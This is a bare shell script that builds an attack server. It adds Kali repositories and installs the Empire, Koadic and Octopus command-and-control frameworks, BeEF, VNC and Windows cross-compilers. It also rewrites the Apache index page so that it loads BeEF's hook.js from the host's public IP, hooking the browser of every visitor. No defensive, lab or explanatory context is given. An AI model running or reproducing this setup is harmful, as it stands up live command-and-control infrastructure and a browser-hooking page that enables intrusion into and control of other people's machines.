apt update && sudo apt upgrade -y
apt install git curl gnupg -y
echo 'deb https://http.kali.org/kali kali-rolling main non-free contrib' > /etc/apt/sources.list.d/kali.list
wget 'https://archive.kali.org/archive-key.asc'
sudo apt-key add archive-key.asc
cd /opt
git clone https://github.com/BC-SECURITY/Empire.git
cd /opt/Empire/setup/
bash install.sh
echo "cd /opt/Empire;python3 empire" > /usr/bin/empire
chmod +x /usr/bin/empire
apt install xfce4 xfce4-goodies -y
apt install tightvncserver -y
apt install beef-xss -y
apt install apache2 -y 
mv /var/www/html/index.html /var/www/html/index.html.bak
echo "it's working<script src=\"http://"$(host myip.opendns.com resolver1.opendns.com | grep "myip.opendns.com has" | awk '{print $4}')":3000/hook.js\"></script>" >> /var/www/html/index.html
systemctl enable apache2.service
cd /opt
git clone https://github.com/zerosum0x0/koadic.git
cd koadic
pip3 install -r requirements.txt
echo "cd /opt/koadic;./koadic" >> /usr/bin/koadic
chmod +x /usr/bin/koadic
apt install nasm -y
apt install mingw-w64 mono-devel -y
cd /opt
git clone https://github.com/mhaskar/Octopus/
cd Octopus
pip3 install -r requirements.txt
echo "cd /opt/Octopus;./octopus.py" >> /usr/bin/octopus
chmod +x /usr/bin/octopus
